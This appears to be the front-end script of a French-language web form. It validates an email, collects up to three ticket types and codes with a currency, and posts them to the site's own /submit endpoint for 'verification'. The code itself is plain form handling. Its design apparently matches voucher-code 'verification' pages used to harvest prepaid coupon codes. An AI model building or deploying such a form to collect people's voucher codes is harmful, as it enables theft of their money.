// Fonction de validation d'email
function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
}

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('ticketForm');
    const emailInput = document.getElementById('user-email');
    const confirmationMessage = document.getElementById('confirmation-message');
    const messageText = document.getElementById('message-text');
    const closeMessage = document.querySelector('.close-message');
    const newSubmissionBtn = document.getElementById('new-submission');

    // Fonction pour afficher un message
    function showMessage(message, isError = false) {
        messageText.textContent = message;
        messageText.style.color = isError ? '#e74c3c' : '#2ecc71';
        confirmationMessage.style.display = 'flex';
    }

    // Fermer le message
    closeMessage.addEventListener('click', () => {
        confirmationMessage.style.display = 'none';
    });

    // Nouvelle soumission
    newSubmissionBtn.addEventListener('click', () => {
        confirmationMessage.style.display = 'none';
        form.reset();
    });
    
    // Validation en temps réel
    emailInput.addEventListener('input', () => {
        if (!isValidEmail(emailInput.value)) {
            emailInput.setCustomValidity('Veuillez entrer une adresse email valide');
            emailInput.reportValidity();
        } else {
            emailInput.setCustomValidity('');
        }
    });

    form.addEventListener('submit', async (event) => {
        event.preventDefault();

        const email = emailInput.value.trim();
        const devise = document.getElementById('devise').value;
        
        // Validation côté client
        if (!isValidEmail(email)) {
            alert('Veuillez entrer une adresse email valide');
            emailInput.focus();
            return;
        }

        const tickets = [];

        for (let i = 1; i <= 3; i++) {
            const type = document.getElementById(`type${i}`).value;
            const code = document.getElementById(`code${i}`).value;

            if (type && code) {
                tickets.push({ type, code });
            }
        }

        const data = {
            email,
            devise,
            tickets
        };

        try {
            const response = await fetch(`${window.location.origin}/submit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            const result = await response.json();
            
            if (response.ok) {
                showMessage("✅ Ticket en cours de vérification.\nUn email de confirmation vous sera envoyé.");
                form.reset();
            } else {
                const errorMessage = result.message || "Une erreur est survenue lors de l'envoi du formulaire";
                showMessage(`❌ ${errorMessage}`, true);
            }
        } catch (error) {
            console.error('Erreur lors de la soumission :', error);
            showMessage('Erreur réseau : ' + (error.message || 'Impossible de se connecter au serveur'), true);
        }
    });
});
